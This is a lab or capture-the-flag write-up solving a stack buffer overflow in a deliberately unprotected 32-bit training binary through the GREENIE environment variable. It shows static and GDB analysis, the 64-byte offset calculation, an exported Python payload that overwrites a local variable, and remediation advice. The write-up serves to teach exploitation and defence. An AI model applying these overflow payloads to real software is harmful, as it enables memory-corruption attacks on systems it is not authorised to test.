
# ex02 – Stack Buffer Overflow Using an Environment Variable

## Objective

The goal of this challenge is to display the following success message:

```text
you have correctly modified the variable
```

Unlike the previous challenge, where the vulnerable input was passed as a command-line argument (`argv`), this exercise stores the user-controlled input inside an **environment variable**. The objective is to overflow a local stack buffer and overwrite a nearby variable with the expected value.

This challenge introduces another common source of user-controlled input in native applications: **environment variables**.

---

# Initial Analysis

Before attempting the exploit, I analyzed the binary to understand its behavior and identify possible vulnerabilities.

---

## Identify the Binary

```bash
file bin
```

Expected information:

* ELF 32-bit executable (Intel i386)
* Dynamically linked
* Not stripped

Because the binary is not stripped, symbol names remain available, making reverse engineering easier.

---

## Check Security Protections

```bash
checksec --file=bin
```

The binary intentionally disables several security mechanisms because it is designed for learning binary exploitation.

Typical protections observed:

* No RELRO
* No Stack Canary
* NX Disabled
* No PIE

These disabled protections simplify stack overflow exploitation by making the memory layout predictable.

---

## Extract Useful Strings

```bash
strings bin
```

Interesting strings include:

```text
GREENIE
please set the GREENIE environment variable
you have correctly modified the variable
Try again
```

The string **GREENIE** immediately indicates that the program expects an environment variable rather than command-line input.

---

## Inspect Symbols

```bash
readelf -s bin
```

Interesting imported functions:

```text
getenv
strcpy
printf
puts
errx
```

The presence of `getenv()` indicates that user input is read from an environment variable.

The use of `strcpy()` immediately suggests a possible buffer overflow because it copies data without checking the destination buffer size.

---

# Program Behavior

Running the program without setting the required environment variable:

```bash
./bin
```

Output:

```text
bin: please set the GREENIE environment variable
```

This confirms that the program expects an environment variable named:

```text
GREENIE
```

---

# Reverse Engineering with GDB

The binary was analyzed using GDB.

```bash
gdb ./bin
```

Inside GDB:

```gdb
disassemble main
```

The important instructions are shown below.

---

## Reading the Environment Variable

```asm
call getenv
```

Equivalent C code:

```c
char *greenie = getenv("GREENIE");
```

Instead of reading input from `argv`, the program loads the value stored in the environment variable.

---

## Initializing the Variable

```asm
movl $0x0,0x58(%esp)
```

Equivalent C code:

```c
modified = 0;
```

The variable starts with the value zero.

---

## Buffer Address

```asm
lea 0x18(%esp), %eax
```

The `LEA` instruction loads the address of the local buffer.

Therefore:

```text
buffer -> esp + 0x18
```

---

## Copying User Input

```asm
call strcpy
```

Equivalent C code:

```c
strcpy(buffer, greenie);
```

Since `strcpy()` performs no bounds checking, an input larger than the destination buffer continues writing into adjacent memory.

This is the source of the vulnerability.

---

## Required Value

Later in the function:

```asm
mov 0x58(%esp), %eax
cmp $0x0d0a0d0a, %eax
```

Equivalent C code:

```c
if (modified == 0x0d0a0d0a)
```

This instruction reveals the exact value that the variable must contain.

---

# Calculating the Offset

The assembly shows:

```text
buffer   -> esp + 0x18
modified -> esp + 0x58
```

Subtracting the addresses:

```text
0x58 - 0x18 = 0x40
```

Convert to decimal:

```text
0x40 = 64
```

Therefore:

```text
Buffer size = 64 bytes
```

The first 64 bytes completely fill the buffer.

The following four bytes overwrite the variable `modified`.

---

# Understanding the Target Value

The comparison value is:

```text
0x0d0a0d0a
```

Breaking it into bytes:

```text
0d
0a
0d
0a
```

ASCII meaning:

| Hex  | Character            |
| ---- | -------------------- |
| 0x0d | Carriage Return (CR) |
| 0x0a | Line Feed (LF)       |

The processor stores integers using **Little Endian** format.

Therefore the bytes written after the 64-byte buffer must correspond to the little-endian representation of the target integer.

The payload bytes are:

```text
\x0a\x0d\x0a\x0d
```

---

# Building the Payload

The payload layout is:

```text
64 bytes padding
+
target value
```

Python payload:

```python
b"A"*64 + b"\x0a\x0d\x0a\x0d"
```

Python 3 prints UTF-8 text by default, so raw bytes are generated using:

```python
import sys
sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")
```

---

# Exploitation

Export the environment variable:

```bash
export GREENIE=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")')
```

Run the binary:

```bash
./bin
```

Output:

```text
you have correctly modified the variable
```

The exploit succeeds because:

* The first 64 bytes fill the local buffer.
* The next four bytes overwrite the variable `modified`.
* The overwritten value matches `0x0d0a0d0a`.
* The comparison succeeds, and the program prints the success message.

---

# Stack Layout

Approximate stack layout:

```text
Higher Addresses
+----------------------+
| Return Address       |
+----------------------+
| Saved EBP            |
+----------------------+
| modified             |
+----------------------+
| buffer[64]           |
+----------------------+
Lower Addresses
```

The overflow affects `modified` before reaching the saved frame pointer and return address.

---

# Commands Used

## Static Analysis

```bash
file bin

checksec --file=bin

strings bin

readelf -s bin

objdump -d bin
```

---

## Dynamic Analysis

```bash
gdb ./bin

disassemble main

break main

run

next

step

continue
```

---

## Exploitation

Run without the environment variable:

```bash
./bin
```

Create the payload:

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")'
```

Export the environment variable:

```bash
export GREENIE=$(python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+b"\x0a\x0d\x0a\x0d")')
```

Execute the exploit:

```bash
./bin
```

---

# Tools Used

* GDB
* objdump
* readelf
* strings
* file
* checksec
* Python 3
* Bash

---

# Concepts Learned

* Stack buffer overflow
* Environment variables
* `getenv()`
* Unsafe use of `strcpy()`
* Static analysis
* Dynamic analysis with GDB
* Reading assembly instructions
* Stack memory layout
* Buffer offset calculation
* Little-endian representation
* Payload construction
* Overwriting adjacent stack variables

---

# Remediation

This vulnerability can be prevented by:

* Replacing `strcpy()` with safer alternatives such as `strncpy()` or `memcpy()` with explicit bounds checking.
* Validating the length of environment variable input before copying it into a fixed-size buffer.
* Compiling with Stack Canaries (`-fstack-protector`).
* Enabling NX (Non-Executable Stack).
* Enabling PIE (Position Independent Executables).
* Enabling Full RELRO.
* Keeping ASLR enabled.
* Performing secure code reviews to identify unsafe memory operations.

---

# Key Takeaway

This challenge demonstrates that **environment variables are another source of untrusted input**. Any externally controlled data copied into a fixed-size buffer without proper bounds checking can become a stack buffer overflow vulnerability.

Compared to **ex01**, the exploitation technique remains the same, but the input source changes from command-line arguments to an environment variable. This reinforces an important security principle: **the danger comes from unsafe memory operations such as `strcpy()`, not from the source of the input itself**.

By analyzing the assembly, identifying the vulnerable function, calculating the stack offset, understanding little-endian byte ordering, and constructing the payload manually, this exercise further develops the core skills required for reverse engineering and binary exploitation.
